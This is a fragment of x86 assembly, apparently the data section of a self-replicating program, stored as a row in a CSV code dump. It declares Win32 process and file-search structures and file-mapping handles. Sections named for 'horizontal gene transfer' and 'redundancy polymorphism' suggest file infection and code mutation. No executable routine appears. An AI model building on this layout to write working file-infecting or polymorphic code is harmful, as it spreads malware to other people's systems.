id,title,username,language,date,content
  StartUp_struct_lpReserved	 dd 0
  StartUp_struct_lpDesktop	 dd 0
  StartUp_struct_lpTitle	 dd 0
  StartUp_struct_dwX		 dd 0
  StartUp_struct_dwY		 dd 0
  StartUp_struct_dwXSize	 dd 0
  StartUp_struct_dwYSize	 dd 0
  StartUp_struct_dwXCountChars	 dd 0
  StartUp_struct_dwYCountChars	 dd 0
  StartUp_struct_dwFillAttribute dd 0
  StartUp_struct_dwFlags	 dd 0
  StartUp_struct_wShowWindow	 dw 0
  StartUp_struct_cbReserved2	 dw 0
  StartUp_struct_lpReserved2	 dd 0
  StartUp_struct_hStdInput	 dd 0
  StartUp_struct_hStdOutput	 dd 0
  StartUp_struct_hStdError	 dd 0


ProcessInfo_struct:
  PROCESS_INFORMATION_hProcess	  dd 0
  PROCESS_INFORMATION_hThread	  dd 0
  PROCESS_INFORMATION_dwProcessId dd 0
  PROCESS_INFORMATION_dwThreadId  dd 0




; *********************************
; *** Horizontal_gene_transfer_data

WIN32_FIND_DATA_struct:
  WIN32_FIND_DATA_dwFileAttributes   dd 0
  WIN32_FIND_DATA_ftCreationTime     FILETIME
  WIN32_FIND_DATA_ftLastAccessTime   FILETIME
  WIN32_FIND_DATA_ftLastWriteTime    FILETIME
  WIN32_FIND_DATA_nFileSizeHigh      dd 0
  WIN32_FIND_DATA_nFileSizeLow	     dd 0
  WIN32_FIND_DATA_dwReserved0	     dd 0
  WIN32_FIND_DATA_dwReserved1	     dd 0
  WIN32_FIND_DATA_cFileName	     db MAX_PATH dup (0)
  WIN32_FIND_DATA_cAlternateFileName db 14 dup (0)

	HGT_searchmask	   dd 0x0

	HGT_FFHandle	   dd 0x0


	HGTFileHandle	   dd 0x0
	HGTMapHandle	   dd 0x0
	HGTMapPointer	   dd 0x0
	HGTFileSize	   dd 0x0
	HGTDidInsert	   dd 0x0

; *********************************
; *** Redundancy polymorphism

	RPAminoAcid1	dd 0x0
	RPAminoAcid2	dd 0x0

; #####
; #####   DATA
; #####
; ############################################################################
; ############################################################################"
